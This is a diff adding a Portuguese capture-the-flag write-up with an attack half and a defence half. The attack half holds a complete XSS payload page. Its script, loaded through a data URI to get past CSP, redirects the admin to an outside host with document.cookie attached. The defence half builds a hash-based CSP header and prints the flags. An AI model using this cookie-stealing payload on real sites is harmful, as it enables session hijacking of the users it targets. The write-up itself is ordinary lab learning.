@@ -1,0 +1,46 @@
+Temos que fazer tanto a defesa quanto o ataque.
+
+#Ataque
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8"> 
+    <title>Praise the sun</title>
+</head>
+<body>
+    <center><img src="https://media1.tenor.com/images/00455861ec4c8ee1761edd3c8bb3a62e/tenor.gif?itemid=5316805" height="120" width="60" /></center>
+   
+<script src="data:application/javascript,window.location.href='https://claudioctf.000webhostapp.com/index.php?c='+document.cookie;"></script>
+
+</body>
+</html>
+
+Coloquei essa pagina HTML como mensagem. Ao ser carregada, o Admin sera redirecionado a:
+https://claudioctf.000webhostapp.com/index.php?c='+document.cookie, passando seu cookie
+para o servidor que recebe cookies. Precisou usar data:application/javascript devido
+às regras CSP
+
+_def3nce_is_fun}
+
+#Defesa
+
+Esta página esta sendo atacada, utilize seu conhecimento em CSP para adicionar o
+cabeçalho de segurança corretamente. Você precisa garantir que os scripts SEGUROS
+serão executados e os scripts XSS serão bloqueados.
+
+Existiam dois scripts praticamente identicos que printavam coisas diferentes:
+<script>console.log("__XSS__")</script>
+<script>console.log("__SEGURO2__")</script>
+
+Como eu quero só permitir o SEGURO2, tive que pegar a sha256 do conteudo do script
+para somente ele ser executado
+
+echo -n 'console.log("__SEGURO2__")' | openssl sha256 -binary | openssl base64
+
+script-src 'nonce-no23h3v8bg' 'sha256-hii6FQk1E5f+ah0rqHNz3DAMNR2abz87DrsJsihCDjU='
+
+Você impediu o ataque com sucesso! A flag é: ALQ{@taqu3_e
+
+
+ALQ{@taqu3_e_def3nce_is_fun}
